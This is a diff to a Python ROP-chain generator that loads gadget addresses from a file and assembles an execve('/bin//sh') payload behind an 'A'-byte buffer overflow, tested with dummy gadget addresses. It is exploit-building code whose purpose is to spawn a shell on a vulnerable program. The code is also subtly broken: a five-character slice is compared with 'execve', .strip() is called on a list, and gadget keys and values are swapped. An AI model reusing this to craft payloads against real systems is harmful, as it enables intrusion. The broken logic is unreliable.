@@ -4,9 +4,23 @@ gadgetdictionary = {
     "NULL" : 0x0
 }
 
-def execve(arguments, bufflength, gadgets):
-    gadgetdictionary.update(gadgets)
+def LoadGadgetDictionary(filename):
+    file = open(filename, "r")
+    for line in file:
+        memoryLocation = line[0:9]
+        gadget = line[13:]
+        gadgetdictionary.update({gadget : memoryLocation})
 
+def CreateROPChain(command, bufflength, gadgetfile):
+    LoadGadgetDictionary(gadgetfile)
+
+    if(command[0:5] == "execve"):
+        print(command[7:].split(',').strip())
+        return execve(command[7:].split(',').strip(), bufflength)
+    return None
+
+
+def execve(arguments, bufflength):
     #add buffer string
     payload = b'A' * bufflength
 
@@ -58,4 +72,5 @@ if __name__ == "__main__":
         "@ .data" : 0x49494949,
         "mov dword ptr [edx], eax" : 0x48484848,
     }
-    print(execve("/bin//sh", 44, dummydict))
+    gadgetdictionary.update(dummydict)
+    print(execve("/bin//sh", 44))
